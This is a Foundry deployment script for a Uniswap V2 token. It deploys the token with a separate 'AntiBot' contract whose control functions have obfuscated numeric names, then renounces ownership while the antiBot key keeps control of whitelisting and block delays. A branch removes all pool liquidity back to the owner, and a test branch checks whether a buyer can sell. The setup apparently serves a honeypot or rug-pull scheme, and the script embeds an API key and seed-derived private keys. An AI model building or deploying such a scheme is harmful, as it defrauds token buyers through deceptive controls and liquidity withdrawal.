// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity >=0.8.5;

import {Script} from "forge-std/Script.sol";
import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {StdCheats} from "forge-std/StdCheats.sol";
import {Vm} from "forge-std/Vm.sol";

import {Token} from "../src/Token.sol";
import {AntiBot} from "../src/antiBot.sol";

import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";

contract NewTokenDeployer is Script, StdCheats {
    IUniswapV2Router02 router =
        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Factory factory =
        IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);

    AntiBot antiBot = AntiBot(0x3E7fd2a5f65FF133b8A8d2bb9Fbdee9177274F01);
    Token newToken = Token(payable(0xF258606419f9172015Be9e90A630c0041FA28946));

    address[] pathBuy = new address[](2);
    address[] pathSell = new address[](2);

    bool BROADCASTING = true;

    bool DEPLOYE_NEW = false;
    bool ADD_LIQUIDITY = false;
    bool CHANGE_DELAY = false;
    bool REMOVE_LIQ = false;
    bool EXEC_CUSTOM = true;

    function run() public {
        (address owner, uint256 ownerKey) = makeAddrAndKey(
            "owner_ftrkgyehty1325135354684trehtrxdeuigefwrfe15684684tgr"
        );
        (address antiBotWallet, uint256 antiBotKey) = makeAddrAndKey(
            "antiBot_ftrkgyehty1325135354684trehtrxdeuigefwrfe15684684tgr"
        );

        if (EXEC_CUSTOM) {
            vm.broadcast(antiBotKey);
            payable(owner).transfer(antiBotWallet.balance);
        }

        console2.log("owner: ", owner);
        console2.log("anti bot: ", antiBotWallet);

        if (!BROADCASTING) {
            payable(owner).transfer(1.5 ether);
        }

        address[] memory whitelistAddresses = new address[](2);
        whitelistAddresses[0] = owner;

        if (CHANGE_DELAY) {
            vm.broadcast(antiBotKey);
            antiBot.changeBlockDelay4568468541621584(2);
        }

        if (DEPLOYE_NEW) {
            vm.broadcast(antiBotKey);
            antiBot = new AntiBot(whitelistAddresses);

            vm.broadcast(ownerKey);
            newToken = new Token(address(antiBot));

            console2.log(
                "forge verify-contract --guess-constructor-args --rpc-url https://rpc.mevblocker.io -e KT5VYSX5F9CHQ9K2KIZ5WMAERKQAM2XWK1 ",
                address(newToken),
                " src/Token.sol:Token"
            );

            pathBuy[0] = router.WETH();
            pathBuy[1] = address(newToken);

            pathSell[0] = pathBuy[1];
            pathSell[1] = pathBuy[0];

            vm.broadcast(antiBotKey);
            antiBot.changeWhitelist46848621332154866486(
                address(newToken),
                true
            );

            vm.startBroadcast(ownerKey);
            console2.log("token address: ", address(newToken));
            // newToken.openTrading{value: 0.4 ether}();
            newToken.renounceOwnership();
            vm.stopBroadcast();
        }

        if (ADD_LIQUIDITY) {
            vm.broadcast(ownerKey);
            newToken.openTrading{value: 0.4 ether}();

            // vm.broadcast(antiBotKey);
            // antiBot.changeBlockDelay4568468541621584(2);
        }

        if (false) {
            vm.stopBroadcast();
            address pair = factory.getPair(router.WETH(), address(newToken));
            (address cindy, uint256 cindyKey) = makeAddrAndKey("Cindy");
            payable(cindy).transfer(0.25 ether);

            vm.startBroadcast(cindyKey);
            for (uint i = 0; i < 2; i++) {
                router.swapExactETHForTokensSupportingFeeOnTransferTokens{
                    value: 0.1 ether
                }(0, pathBuy, cindy, block.timestamp + 30);
                uint cindyTokenBalance = newToken.balanceOf(cindy);
                //console2.log("Block number: ", block.number);
                vm.roll(block.number + 5);
                console2.log(
                    "Cindy buy block: ",
                    antiBot.addressToBuyBlock(cindy)
                );
                console2.log(
                    "Pair buy block: ",
                    antiBot.addressToBuyBlock(pair)
                );
                console2.log("Cindy token balance before: ", cindyTokenBalance);

                newToken.approve(address(router), type(uint).max);

                console2.log("Block number: ", block.number);

                router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    cindyTokenBalance,
                    0,
                    pathSell,
                    cindy,
                    block.timestamp + 30
                );

                console2.log(
                    "Cindy token balance after: ",
                    newToken.balanceOf(cindy)
                );
            }

            vm.stopBroadcast();

            vm.startBroadcast(ownerKey);
        }

        // console2.log("Balance before: ", owner.balance);

        if (REMOVE_LIQ) {
            address pair = factory.getPair(router.WETH(), address(newToken));

            vm.startBroadcast(ownerKey);
            Token(payable(pair)).approve(address(router), type(uint).max);
            router.removeLiquidityETH(
                address(newToken),
                Token(payable(pair)).balanceOf(owner),
                0,
                0,
                owner,
                block.timestamp + 100
            );

            console2.log("Balance after: ", address(owner).balance);
            vm.stopBroadcast();
        }

        // // console2.log("Balance after: ", owner.balance);

        //KT5VYSX5F9CHQ9K2KIZ5WMAERKQAM2XWK1
        //forge verify-contract 0x2e6237f6409Bb4f85B52795C2De31beD15620e63 --chain-id 1 src/NewToken.sol:NewToken -e KT5VYSX5F9CHQ9K2KIZ5WMAERKQAM2XWK1
    }
}
